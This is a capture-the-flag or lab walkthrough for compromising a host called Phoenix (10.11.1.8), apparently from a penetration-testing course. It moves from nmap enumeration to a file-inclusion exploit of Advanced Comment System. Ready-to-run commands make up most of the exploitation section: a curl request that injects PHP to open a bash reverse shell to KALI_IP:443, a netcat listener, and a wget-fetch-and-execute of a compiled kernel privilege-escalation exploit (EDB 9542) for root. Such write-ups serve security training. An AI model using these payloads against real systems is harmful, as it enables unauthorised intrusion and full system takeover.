# Phoenix (10.11.1.8)
****
## Enumeration

1. Enumerate running services using `nmap`
```
nmap -sV -sC -Pn 10.11.1.8
```
   
2. `nmap` shows that an Apache web server is running on port 80. Nmap was able to detect a `robots.txt` file with 2 disallowed entries . One of it is a directory called "**internal**"
![[10.11.1.8 - phoenix (done)/screenshots/nmap-p80.png]]

3. http://10.11.1.8/internal/ shows a demo page with a commenting feature. Viewing the source code of the page reveals another directory called "**advanced_comment_system**"
      ![[10.11.1.8 - phoenix (done)/screenshots/acs-dir.png]]
  
4. A quick Google search of the keyword "**advanced comment system**" shows several public exploits
      ![[phoenix-exploits.png]]
> [!info] 
> **Advanced Comment System** is a PHP application that is vulnerable to **File Inclusion** (both remote and local), which could lead to **Remote Code Execution** .


****
## Exploitation

1. Start a netcat listener on port 443 (as root)
> [!important] 
> We need to use port 443 as listening port for our reverse shell
```
sudo nc -nlvp 443
```
   
2. Establish a reverse shell by running the following `curl` command.
   
```
curl -s --data "<?system('/bin/bash -i >& /dev/tcp/KALI_IP/443 0>&1');?>" 'http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00'
```

> [!note] 
> Replace the `KALI_IP` with your Kali's IP address 

3. We should now have a reverse shell running as `apache`.
   ![[apache.png]]

****
## Post-exploitation
1. Enumeration shows that the server is running **CentOS** with Linux kernel version **2.6.9** , which is vulnerable to **# ip_append_data() Ring0 Privilege Escalation**. 
   
   ![[phoenix-searchsploit.png]]
   
2. Download and compile the script from [EDB 9542](https://www.exploit-db.com/exploits/9542)
 
```
gcc -m32 -Wl,--hash-style=both -o exploit 9542.c  
```
   
> [!important] 
> We need to compile this on older version of GLIBC.    
   
3. Upgrade our simple shell to TTY shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

4. Transfer the compiled exploit and run it into the target machine.
 
```
cd /tmp && wget http://KALI_IP/exploit && chmod +x exploit && ./exploit 
```

> [!tip] 
> We need to find a directory where **apache** user has a write access

5. We should now have a root access and we should be able to read the flag.
	![[phoenix-proof.png]]
